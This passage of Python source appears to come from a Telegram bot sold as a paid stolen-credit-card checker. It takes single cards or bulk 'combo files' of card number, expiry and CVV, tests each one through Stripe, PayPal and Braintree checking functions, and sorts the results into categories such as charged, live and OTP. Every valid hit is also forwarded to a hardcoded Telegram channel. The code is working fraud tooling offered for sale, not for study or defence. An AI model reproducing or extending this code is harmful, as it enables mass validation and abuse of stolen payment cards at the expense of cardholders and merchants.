		else:
			language = 'en'
		msg = """Invalid command format. Please use '/chk <card>'"""
		msg1 = """The Checking Started, Wait ⌛"""
		msg2 = """An error occurred:"""
		if language == 'es':
			msg = """Formato de comando no válido. Utilice '/chk <tarjeta>'"""
			msg1 = """La comprobación comenzó, espera. ⏳"""
			msg2 = """Ocurrió un error:"""
		try:
			card_details = message.text.split(' ')
			if len(card_details) != 2:bot.send_message(message.chat.id, msg,parse_mode='none');return
			card_details = message.text.split(' ')[1]
			initial_message = bot.reply_to(message, msg1)
			result = api(card_details)
			bot_msg = result[4]
			bin_inf = bin_info(result[0])
			edited_message = bot_msg.replace("bin_info",f"═════『 𝐁𝐈𝐍 𝐈𝐍𝐅𝐎 』═════\n{bin_inf}")
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=edited_message)
		except Exception as e:
			bot.send_message(chat_id=chat_id, text=f"{msg2} " + str(e))
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['str','ss','mm','kk','au'])
def stripe_chk_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	if bot_working:
		chat_id = message.chat.id
		if chat_id in user_language:
		   language = user_language[chat_id]
		else:
			language = 'en'
		msg = """Invalid command format. Please use '/str <card>'"""
		msg1 = """The Checking Started, Wait ⌛"""
		msg2 = """An error occurred:"""
		if language == 'es':
			msg = """Formato de comando no válido. Utilice '/str <tarjeta>'"""
			msg1 = """La comprobación comenzó, espera. ⏳"""
			msg2 = """Ocurrió un error:"""
		try:
			card_de = message.text.split(' ')
			if len(card_de) != 2:bot.send_message(message.chat.id, msg,parse_mode='none');return
			card_details = message.text.split(' ')[1]
			initial_message = bot.reply_to(message, msg1)
			print(card_de[0])
			
			if card_de[0] == "/str":
				result = strr(card_details)
			elif card_de[0] == "/ss":
				result = ss(card_details)
			elif card_de[0] == "/mm":
				result = mm(card_details)
			elif card_de[0] == "/kk":
				result = kk(card_details)
			elif card_de[0] == "/au":
				result = au(card_details)
				
			bot_msg = result[4]
			bin_inf = bin_info(result[0])
			edited_message = bot_msg.replace("bin_info",f"═════『 𝐁𝐈𝐍 𝐈𝐍𝐅𝐎 』═════\n{bin_inf}")
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=edited_message)
		except Exception as e:
			bot.send_message(chat_id=chat_id, text=f"{msg2} " + str(e))
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['pay','pn','ps','pp','pa'])
def paypal_chk_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	if bot_working:
		chat_id = message.chat.id
		if chat_id in user_language:
		   language = user_language[chat_id]
		else:
			language = 'en'
		msg = """Invalid command format. Please use '/pay <card>'"""
		msg1 = """The Checking Started, Wait ⌛"""
		msg2 = """An error occurred:"""
		if language == 'es':
			msg = """Formato de comando no válido. Utilice '/pay <tarjeta>'"""
			msg1 = """La comprobación comenzó, espera. ⏳"""
			msg2 = """Ocurrió un error:"""	
		try:
			card_de = message.text.split(' ')
			if len(card_de) != 2:
				bot.send_message(message.chat.id, msg, parse_mode='none')
				return
			card_details = message.text.split(' ')[1]
			initial_message = bot.reply_to(message, msg1)
			for _ in range (5):
				try:
					if card_de[0] == "/pay":
						result = process_card_p(card_details)
					elif card_de[0] == "/pn":
						result = pn(card_details)
					elif card_de[0] == "/ps":
						result = ps(card_details)
					elif card_de[0] == "/pp":
						result = pp(card_details)
					elif card_de[0] == "/pa":
						result = pa(card_details)
						
					card = result[4]
					bin_inf = bin_info(result[0])
					edited_message = (f"{card}")
					edited_message = edited_message.replace("bin_info",f"═════『 𝐁𝐈𝐍 𝐈𝐍𝐅𝐎 』═════\n{bin_inf}")
					print(edited_message)
					bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=edited_message)
					break
				except Exception:pass
		except Exception as e:
			bot.send_message(chat_id=chat_id, text=f"{msg2} " + str(e))
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['filestr']) #15
def stripe_fill_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	global is_card_checking
	chat_id = message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = "You are not allwod to use this bot"
	msg1 = "send the combo file"
	msg2 = "The Checking Started, Wait ⌛"
	msg3 = "Checking in progress Wait..."
	msg4 = "The Bot Finished Checking"
	if language == 'es':
		msg = "No tienes permiso para usar este bot."
		msg1 = "enviar el archivo combinado"
		msg2 = "La comprobación comenzó, espera.⏳"
		msg3 = "Comprobando en progreso Espere..."
		msg4 = "El bot terminó de comprobar"
	if bot_working:
		if not is_user_allowed(chat_id):bot.reply_to(message,msg);return
		bot.reply_to(message,msg1)
		@bot.message_handler(content_types=['document'])
		def handle_card_file(message):
			global is_card_checking
			is_card_checking = True
			try:
				file_info = bot.get_file(message.document.file_id)
				
				downloaded_file = bot.download_file(file_info.file_path)
				
				file_content = downloaded_file.decode('utf-8')
				
				card_lines = file_content.strip().split('\n')
				total_cards = len(card_lines)
				processed_cards = 0
				msg = bot.send_message(chat_id=message.chat.id,text=msg2)
#—————–————–———————––———#
				not_working_cards = []
				working_cards = []
				cards_3D_secure = [] 
				insufficient_founds = []
				ccn_cards = []
				live_cards = []
#—————–————–———————––———#
				for card in card_lines:
					if not is_card_checking:return
					processed_cards +=1
					progress = (processed_cards / total_cards) * 100
					result = process_card(card)
					num = result[3]
					lists_mapping = {
						1: working_cards,
						2: live_cards,
						3: insufficient_founds,
						4: ccn_cards,
						5: not_working_cards,
						6: cards_3D_secure}
	
					if num in lists_mapping:
						lists_mapping[num].append(card)
#—————–————–———————––———#
					msg_text = result[1]
					if result[2] == True:
						bin_inf = bin_info(result[0])
						edited_message = (f"{card}")
						edited_message = result[4].replace("bin_info",f"═════『 𝐁𝐈𝐍 𝐈𝐍𝐅𝐎 』═════\n{bin_inf}")
						bot.send_message(chat_id,edited_message)
						bot.send_message(-1001785647760,edited_message)
#—————–————–———————––———#
					if language == 'en':
						reply_markup = create_reply_markup(card, len(not_working_cards),len(live_cards), len(working_cards), len(cards_3D_secure) ,len(insufficient_founds),len(ccn_cards),msg_text,len(card_lines),progress)
					if language == 'es':
						reply_markup = create_es_reply_markup(card, len(not_working_cards),len(live_cards), len(working_cards), len(cards_3D_secure) ,len(insufficient_founds),len(ccn_cards),msg_text,len(card_lines),progress)
					try:
						bot.edit_message_text(
chat_id=message.chat.id,
message_id=msg.message_id,
text=msg3,
reply_markup=reply_markup
					)
					except telebot.apihelper.ApiTelegramException:
						time.sleep(2)
				bot.reply_to(message,msg4)
				is_card_checking = False
			except Exception as e:
				print(e)
	else:
			pass
#—————–————–———————––———#
	def create_reply_markup(current_card, num_not_working, num_live, num_working,num_cards_3D_secure, num_insufficient_founds, num_ccn, message_text, All,progress):
		
		markup = telebot.types.InlineKeyboardMarkup()
	
		current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
		
		message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
		
		working_button = telebot.types.InlineKeyboardButton(text=f"Charged: {num_working}", callback_data="working")

		live_button = telebot.types.InlineKeyboardButton(text=f"Live: {num_live}", callback_data="live")
		
		insufficient_button = telebot.types.InlineKeyboardButton(text=f"Insuff Founds: {num_insufficient_founds}", callback_data="no thing")
		
		ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
			
		all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • All: {All} ┇ Declined: {num_not_working} ┇OTP: {num_cards_3D_secure} • ⌟", callback_data="no thing")
		
		progress_button = telebot.types.InlineKeyboardButton(text=f"Progreso: {progress:.2f}%", callback_data="progress")
		
		stop_button = telebot.types.InlineKeyboardButton(text="〄 STOP 〄", callback_data="stop")
	
		markup.row(current_card_button)
		markup.row(message_button)
		markup.row(working_button,live_button)
		markup.row(insufficient_button,ccn_button)
		markup.row(all_button)
		markup.row(progress_button)
		markup.row(stop_button)
		return markup
	@bot.callback_query_handler(func=lambda call: True)
	def handle_callback_query(call):
		global is_card_checking
		if call.data == "stop":
			is_card_checking = False
			if language == 'en':
				bot.answer_callback_query(call.id, text="Card checking stopped.")
			if language == 'es':
				bot.answer_callback_query(call.id, text="Se detuvo la verificación de tarjetas.")
#—————–————–———————––———#
	def create_es_reply_markup(current_card, num_not_working, num_live, num_working,num_cards_3D_secure, num_insufficient_founds, num_ccn, message_text, All,progress):
		
		markup = telebot.types.InlineKeyboardMarkup()
	
		current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
		
		message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
		
		working_button = telebot.types.InlineKeyboardButton(text=f"Cargado: {num_working}", callback_data="working")

		live_button = telebot.types.InlineKeyboardButton(text=f"Vivir: {num_live}", callback_data="live")
		
		insufficient_button = telebot.types.InlineKeyboardButton(text=f"Fondos insuficientes : {num_insufficient_founds}", callback_data="no thing")
		
		ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
			
		all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • Todo: {All} ┇ Rechazado: {num_not_working} ┇OTP: {num_cards_3D_secure} • ⌟", callback_data="no thing")
		
		progress_button = telebot.types.InlineKeyboardButton(text=f"Progress: {progress:.2f}%", callback_data="progress")
		
		stop_button = telebot.types.InlineKeyboardButton(text="〄 DETENER 〄", callback_data="stop")
	
		markup.row(current_card_button)
		markup.row(message_button)
		markup.row(working_button,live_button)
		markup.row(insufficient_button,ccn_button)
		markup.row(all_button)
		markup.row(progress_button)
		markup.row(stop_button)
		return markup
#—————–————–———————––———#
@bot.message_handler(commands=['fstr','fss','fmm','fkk','fau']) #15
def stripe_all_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	global is_card_checking
	global card_de
	chat_id = message.chat.id
	card_de = message.text
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = "You are not allwod to use this bot"
	msg1 = "send the combo file"
	msg2 = "The Checking Started, Wait ⌛"
	msg3 = "Checking in progress Wait..."
	msg4 = "The Bot Finished Checking"
	if language == 'es':
		msg = "No tienes permiso para usar este bot."
		msg1 = "enviar el archivo combinado"
		msg2 = "La comprobación comenzó, espera.⏳"
		msg3 = "Comprobando en progreso Espere..."
		msg4 = "El bot terminó de comprobar"
	if bot_working:
		if not is_user_allowed(chat_id):bot.reply_to(message,msg);return
		bot.reply_to(message,msg1)
		@bot.message_handler(content_types=['document'])
		def handle_card_file(message):
			global is_card_checking
			global card_de
			is_card_checking = True
			try:
				file_info = bot.get_file(message.document.file_id)
				
				downloaded_file = bot.download_file(file_info.file_path)
				
				file_content = downloaded_file.decode('utf-8')
				
				card_lines = file_content.strip().split('\n')
				total_cards = len(card_lines)
				processed_cards = 0
				msg = bot.send_message(chat_id=message.chat.id,text=msg2)
#—————–————–———————––———#
				not_working_cards = []
				working_cards = []
				cards_3D_secure = [] 
				insufficient_founds = []
				ccn_cards = []
				live_cards = []
#—————–————–———————––———#
				for card in card_lines:
					if not is_card_checking:return
					processed_cards +=1
					progress = (processed_cards / total_cards) * 100
					print(card_de)
					if card_de == "/fss":
						result = ss(card)
					elif card_de == "/fstr":
						result = strr(card)
					elif card_de == "/fmm":
						result = mm(card)
					elif card_de == "/fkk":
						result = kk(card)
					elif card_de == "/fau":
						result = au(card)

					num = result[3]
					lists_mapping = {
						1: working_cards,
						2: live_cards,
						3: insufficient_founds,
						4: ccn_cards,
						5: not_working_cards,
						6: cards_3D_secure}
	
					if num in lists_mapping:
						lists_mapping[num].append(card)
#—————–————–———————––———#
					msg_text = result[1]
					if result[2] == True:
						bin_inf = bin_info(result[0])
						edited_message = (f"{card}")
						edited_message = result[4].replace("bin_info",f"═════『 𝐁𝐈𝐍 𝐈𝐍𝐅𝐎 』════\n{bin_inf}")
						bot.send_message(chat_id,edited_message)
						bot.send_message(-1001785647760,edited_message)
						
#—————–————–———————––———#
					if language == 'en':
						reply_markup = create_reply_markup(card, len(not_working_cards),len(live_cards), len(working_cards), len(cards_3D_secure) ,len(insufficient_founds),len(ccn_cards),msg_text,len(card_lines),progress)
					if language == 'es':
						reply_markup = create_es_reply_markup(card, len(not_working_cards),len(live_cards), len(working_cards), len(cards_3D_secure) ,len(insufficient_founds),len(ccn_cards),msg_text,len(card_lines),progress)
					try:
						bot.edit_message_text(
chat_id=message.chat.id,
message_id=msg.message_id,
text=msg3,
reply_markup=reply_markup
					)
					except telebot.apihelper.ApiTelegramException:
						time.sleep(2)
				bot.reply_to(message,msg4)
				is_card_checking = False
			except Exception as e:
				print(e)
	else:
			pass
#—————–————–———————––———#
	def create_reply_markup(current_card, num_not_working, num_live, num_working,num_cards_3D_secure, num_insufficient_founds, num_ccn, message_text, All,progress):
		
		markup = telebot.types.InlineKeyboardMarkup()
	
		current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
		
		message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
		
		working_button = telebot.types.InlineKeyboardButton(text=f"Charged: {num_working}", callback_data="working")

		live_button = telebot.types.InlineKeyboardButton(text=f"Live: {num_live}", callback_data="live")
		
		insufficient_button = telebot.types.InlineKeyboardButton(text=f"Insuff Founds: {num_insufficient_founds}", callback_data="no thing")
		
		ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
			
		all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • All: {All} ┇ Declined: {num_not_working} ┇OTP: {num_cards_3D_secure} • ⌟", callback_data="no thing")
		
		progress_button = telebot.types.InlineKeyboardButton(text=f"Progress: {progress:.2f}%", callback_data="progress")
		
		stop_button = telebot.types.InlineKeyboardButton(text="〄 STOP 〄", callback_data="stop")
	
		markup.row(current_card_button)
		markup.row(message_button)
		markup.row(working_button,live_button)
		markup.row(insufficient_button,ccn_button)
		markup.row(all_button)
		markup.row(progress_button)
		markup.row(stop_button)
		return markup
	@bot.callback_query_handler(func=lambda call: True)
	def handle_callback_query(call):
		global is_card_checking
		if call.data == "stop":
			is_card_checking = False
			if language == 'en':
				bot.answer_callback_query(call.id, text="Card checking stopped.")
			if language == 'es':
				bot.answer_callback_query(call.id, text="Se detuvo la verificación de tarjetas.")
#—————–————–———————––———#
	def create_es_reply_markup(current_card, num_not_working, num_live, num_working,num_cards_3D_secure, num_insufficient_founds, num_ccn, message_text, All,progress):
		
		markup = telebot.types.InlineKeyboardMarkup()
	
		current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
		
		message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
		
		working_button = telebot.types.InlineKeyboardButton(text=f"Cargado: {num_working}", callback_data="working")

		live_button = telebot.types.InlineKeyboardButton(text=f"Vivir: {num_live}", callback_data="live")
		
		insufficient_button = telebot.types.InlineKeyboardButton(text=f"Fondos insuficientes : {num_insufficient_founds}", callback_data="no thing")
		
		ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
			
		all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • Todo: {All} ┇ Rechazado: {num_not_working} ┇OTP: {num_cards_3D_secure} • ⌟", callback_data="no thing")
		
		progress_button = telebot.types.InlineKeyboardButton(text=f"Progreso: {progress:.2f}%", callback_data="progress")
		
		stop_button = telebot.types.InlineKeyboardButton(text="〄 DETENER 〄", callback_data="stop")
	
		markup.row(current_card_button)
		markup.row(message_button)
		markup.row(working_button,live_button)
		markup.row(insufficient_button,ccn_button)
		markup.row(all_button)
		markup.row(progress_button)
		markup.row(stop_button)
		return markup
		
#—————–————–———————––———#
@bot.message_handler(commands=['fpn','fpp','fpa','fps']) #15
def paypal_all_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	global is_card_checking
	global card_de
	chat_id = message.chat.id
	card_de = message.text
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = "You are not allwod to use this bot"
	msg1 = "send the combo file"
	msg2 = "The Checking Started, Wait ⌛"
	msg3 = "Checking in progress Wait..."
	msg4 = "The Bot Finished Checking"
	if language == 'es':
		msg = "No tienes permiso para usar este bot."
		msg1 = "enviar el archivo combinado"
		msg2 = "La comprobación comenzó, espera.⏳"
		msg3 = "Comprobando en progreso Espere..."
		msg4 = "El bot terminó de comprobar"
	if bot_working:
		if not is_user_allowed(chat_id):bot.reply_to(message,msg);return
		bot.reply_to(message,msg1)
		@bot.message_handler(content_types=['document'])
		def handle_card_file(message):
			global is_card_checking
			global card_de
			is_card_checking = True
			try:
				file_info = bot.get_file(message.document.file_id)
				
				downloaded_file = bot.download_file(file_info.file_path)
				
				file_content = downloaded_file.decode('utf-8')
				
				card_lines = file_content.strip().split('\n')
				total_cards = len(card_lines)
				processed_cards = 0
				msg = bot.send_message(chat_id=message.chat.id,text=msg2)
#—————–————–———————––———#
				not_working_cards = []
				working_cards = []
				cards_3D_secure = [] 
				insufficient_founds = []
				ccn_cards = []
				live_cards = []
#—————–————–———————––———#
				for card in card_lines:
					if not is_card_checking:return
					processed_cards += 1
					progress = (processed_cards / total_cards) * 100
					print(card_de)
					if card_de == "/fpp":
						result = pp(card)
					elif card_de == "/fpn":
						result = pn(card)
					elif card_de == "/fpa":
						result = pa(card)
					elif card_de == "/fps":
						result = ps(card)

					num = result[3]
					lists_mapping = {
						1: working_cards,
						2: live_cards,
						#3: insufficient_founds,
						#4: ccn_cards,
						5: not_working_cards,
						#6: cards_3D_secure
						}
	
					if num in lists_mapping:
						lists_mapping[num].append(card)
#—————–————–———————––———#
					msg_text = result[1]
					if result[2] == True:
						bin_inf = bin_info(result[0])
						edited_message = (f"{card}")
						edited_message = result[4].replace("bin_info",f"═════『 𝐁𝐈𝐍 𝐈𝐍𝐅𝐎 』═════\n{bin_inf}")
						bot.send_message(chat_id,edited_message)
						bot.send_message(-1001785647760,edited_message)
#—————–————–———————––———#
					if language == 'en':
						reply_markup = create_reply_markup(card, len(not_working_cards),len(live_cards), len(working_cards), len(cards_3D_secure) ,len(insufficient_founds),len(ccn_cards),msg_text,len(card_lines),progress)
					if language == 'es':
						reply_markup = create_es_reply_markup(card, len(not_working_cards),len(live_cards), len(working_cards), len(cards_3D_secure) ,len(insufficient_founds),len(ccn_cards),msg_text,len(card_lines),progress)
					try:
						bot.edit_message_text(
chat_id=message.chat.id,
message_id=msg.message_id,
text=msg3,
reply_markup=reply_markup
					)
					except telebot.apihelper.ApiTelegramException:
						time.sleep(2)
				bot.reply_to(message,msg4)
				is_card_checking = False
			except Exception as e:
				print(e)
	else:
			pass
#—————–————–———————––———#
	def create_reply_markup(current_card, num_not_working, num_live, num_working,num_cards_3D_secure, num_insufficient_founds, num_ccn, message_text, All,progress):
		
		markup = telebot.types.InlineKeyboardMarkup()
	
		current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
		
		message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
		
		working_button = telebot.types.InlineKeyboardButton(text=f"Charged: {num_working}", callback_data="working")

		live_button = telebot.types.InlineKeyboardButton(text=f"Live: {num_live}", callback_data="live")
		
		#insufficient_button = telebot.types.InlineKeyboardButton(text=f"Insuff Founds: {num_insufficient_founds}", callback_data="no thing")
		
		#ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
			
		all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • All: {All} ┇ Declined: {num_not_working} • ⌟", callback_data="no thing")
		
		progress_button = telebot.types.InlineKeyboardButton(text=f"Progress: {progress:.2f}%", callback_data="progress")
		
		stop_button = telebot.types.InlineKeyboardButton(text="〄 STOP 〄", callback_data="stop")
	
		markup.row(current_card_button)
		markup.row(message_button)
		markup.row(working_button,live_button)
		#markup.row(insufficient_button,ccn_button)
		markup.row(all_button)
		markup.row(progress_button)
		markup.row(stop_button)
		return markup
		
	@bot.callback_query_handler(func=lambda call: True)
	def handle_callback_query(call):
		global is_card_checking
		if call.data == "stop":
			is_card_checking = False
			if language == 'en':
				bot.answer_callback_query(call.id, text="Card checking stopped.")
			if language == 'es':
				bot.answer_callback_query(call.id, text="Se detuvo la verificación de tarjetas.")
#—————–————–———————––———#
	def create_es_reply_markup(current_card, num_not_working, num_live, num_working,num_cards_3D_secure, num_insufficient_founds, num_ccn, message_text, All,progress):
		
		markup = telebot.types.InlineKeyboardMarkup()
	
		current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
		
		message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
		
		working_button = telebot.types.InlineKeyboardButton(text=f"Cargado: {num_working}", callback_data="working")

		live_button = telebot.types.InlineKeyboardButton(text=f"Vivir: {num_live}", callback_data="live")
		
		#insufficient_button = telebot.types.InlineKeyboardButton(text=f"Fondos insuficientes : {num_insufficient_founds}", callback_data="no thing")
		
		#ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
			
		all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • Todo: {All} ┇ Rechazado: {num_not_working} • ⌟", callback_data="no thing")
		
		progress_button = telebot.types.InlineKeyboardButton(text=f"Progreso: {progress:.2f}%", callback_data="progress")
		
		stop_button = telebot.types.InlineKeyboardButton(text="〄 DETENER 〄", callback_data="stop")
	
		markup.row(current_card_button)
		markup.row(message_button)
		markup.row(working_button,live_button)
		#markup.row(insufficient_button,ccn_button)
		markup.row(all_button)
		markup.row(progress_button)
		markup.row(stop_button)
		return markup
#——–——–——–—FILE——–——–—–—–—#
@bot.message_handler(commands=['file'])#16
def brintree_file_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	global is_card_checking
	chat_id = message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = "You are not allwod to use this bot"
	msg1 = "send the combo file"
	msg2 = "The Checking Started, Wait ⌛"
	msg3 = "Checking in progress Wait..."
	msg4 = "The Bot Finished Checking"
	if language == 'es':
		msg = "No tienes permiso para usar este bot."
		msg1 = "enviar el archivo combinado"
		msg2 = "La comprobación comenzó, espera.⏳"
		msg3 = "Comprobando en progreso Espere..."
		msg4 = "El bot terminó de comprobar"
	if bot_working:
		if not is_user_allowed(chat_id):bot.reply_to(message,msg);return
		bot.reply_to(message,msg1)
		@bot.message_handler(content_types=['document'])
		def handle_card_file(message):
			global is_card_checking
			is_card_checking = True
			try:
				file_info = bot.get_file(message.document.file_id)
				
				downloaded_file = bot.download_file(file_info.file_path)
				
				file_content = downloaded_file.decode('utf-8')
				
				card_lines = file_content.strip().split('\n')
				total_cards = len(card_lines)
				processed_cards = 0
				msg = bot.send_message(chat_id=message.chat.id,text=msg2)
#—————–————–———————––———#
				not_working_cards = []
				working_cards = []
				risk_cards = [] 
				insufficient_founds = []
				ccn_cards = []
				live_cards = []
#—————–————–———————––———#
				for card in card_lines:
					if not is_card_checking:return
					cc, mes, ano, cvv = map(str.strip, card.split('|'))
					processed_cards += 1
					progress = (processed_cards / total_cards) * 100
					card = (f"{cc}|{mes}|{ano}|{cvv}")
					
					result = api(card)
					num = result[3]
					lists_mapping = {
						1: working_cards,
						2: live_cards,
						3: insufficient_founds,
						4: ccn_cards,
						5: not_working_cards,
						6: risk_cards
						}
	
					if num in lists_mapping:
						lists_mapping[num].append(card)
#—————–————–———————––———#
					msg_text = result[1]
					if result[2] == True:
						bin_inf = bin_info(result[0])
						edited_message = (f"{card}")
						edited_message = result[4].replace("bin_info",f"═════『 𝐁𝐈𝐍 𝐈𝐍𝐅𝐎 』═════\n{bin_inf}")
						bot.send_message(chat_id,edited_message)
						bot.send_message(-1001785647760,edited_message)
#—————–————–———————––———#
					if language == 'en':
						reply_markup = breintree_markup(card, len(not_working_cards),len(live_cards), len(insufficient_founds),len(ccn_cards),msg_text,len(card_lines),len(risk_cards),progress)
					if language == 'es':
						reply_markup = breintree_es_markup(card, len(not_working_cards),len(live_cards), len(insufficient_founds),len(ccn_cards),msg_text,len(card_lines),len(risk_cards),progress)
					try:
						bot.edit_message_text(
chat_id=message.chat.id,
message_id=msg.message_id,
text=msg3,
reply_markup=reply_markup
					)
					except telebot.apihelper.ApiTelegramException:
						time.sleep(2)
				bot.reply_to(message,msg4)
				is_card_checking = False
			except Exception as e:
				print(e)
	else:
			pass
#—————–————–———————––———#
	def breintree_markup(current_card, num_not_working, num_live,  num_insufficient_founds, num_ccn, message_text, All,num_risk,progress):
		
		markup = telebot.types.InlineKeyboardMarkup()
	
		current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
		
		message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
		
		live_button = telebot.types.InlineKeyboardButton(text=f"Live: {num_live}", callback_data="live")
		
		insufficient_button = telebot.types.InlineKeyboardButton(text=f"Insuff Founds: {num_insufficient_founds}", callback_data="no thing")
		
		ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
			
		all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • All: {All} ┇ Declined: {num_not_working} ┇OTP: {num_risk} • ⌟", callback_data="no thing")
		
		progress_button = telebot.types.InlineKeyboardButton(text=f"Progress: {progress:.2f}%", callback_data="progress")
		
		stop_button = telebot.types.InlineKeyboardButton(text="〄 STOP 〄", callback_data="stop")
	
		markup.row(current_card_button)
		markup.row(message_button)
		markup.row(live_button)
		markup.row(insufficient_button,ccn_button)
		markup.row(all_button)
		markup.row(progress_button)
		markup.row(stop_button)
		return markup
	@bot.callback_query_handler(func=lambda call: True)
	def handle_callback_query(call):
		global is_card_checking
		if call.data == "stop":
			is_card_checking = False
			if language == 'en':
				bot.answer_callback_query(call.id, text="Card checking stopped.")
			if language == 'es':
				bot.answer_callback_query(call.id, text="Se detuvo la verificación de tarjetas.")
#—————–————–———————––———#
	def breintree_es_markup(current_card, num_not_working, num_live,  num_insufficient_founds, num_ccn, message_text, All,num_risk,progress):
		
		markup = telebot.types.InlineKeyboardMarkup()
	
		current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
		
		message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
		
		live_button = telebot.types.InlineKeyboardButton(text=f"Vivir: {num_live}", callback_data="live")
		
		insufficient_button = telebot.types.InlineKeyboardButton(text=f"Fondos insuficientes : {num_insufficient_founds}", callback_data="no thing")
		
		ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
			
		all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • Todo: {All} ┇ Rechazado: {num_not_working} ┇RIESGO: {num_risk} • ⌟", callback_data="no thing")
		
		progress_button = telebot.types.InlineKeyboardButton(text=f"Progreso: {progress:.2f}%", callback_data="progress")
		
		stop_button = telebot.types.InlineKeyboardButton(text="〄 DETENER 〄", callback_data="stop")
	
		markup.row(current_card_button)
		markup.row(message_button)
		markup.row(live_button)
		markup.row(insufficient_button,ccn_button)
		markup.row(all_button)
		markup.row(progress_button)
		markup.row(stop_button)
		return markup
#—————–————–———————––———#
@bot.message_handler(commands=['filep'])#17
def payal_file_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	global is_card_checking
	chat_id = message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = "You are not allwod to use this bot"
	msg1 = "send the combo file"
	msg2 = "The Checking Started, Wait ⌛"
	msg3 = "Checking in progress Wait..."
	msg4 = "The Bot Finished Checking"
	if language == 'es':
		msg = "No tienes permiso para usar este bot."
		msg1 = "enviar el archivo combinado"
		msg2 = "La comprobación comenzó, espera.⏳"
		msg3 = "Comprobando en progreso Espere..."
		msg4 = "El bot terminó de comprobar"
	if bot_working:
		if not is_user_allowed(chat_id):bot.reply_to(message,msg);return
		bot.reply_to(message,msg1)
		@bot.message_handler(content_types=['document'])
		def handle_card_file(message):
			global is_card_checking
			is_card_checking = True
			try:
				file_info = bot.get_file(message.document.file_id)
				
				downloaded_file = bot.download_file(file_info.file_path)
				
				file_content = downloaded_file.decode('utf-8')
				
				card_lines = file_content.strip().split('\n')
				total_cards = len(card_lines)
				processed_cards = 0
				msg = bot.send_message(chat_id=message.chat.id,text=msg2)
#—————–————–———————––———#
				not_working_cards = []
				working_cards = []
				risk_cards = [] 
				insufficient_founds = []
				ccn_cards = []
#—————–————–———————––———#
				for card in card_lines:
					if not is_card_checking:return
					cc, mes, ano, cvv = map(str.strip, card.split('|'))
					processed_cards += 1
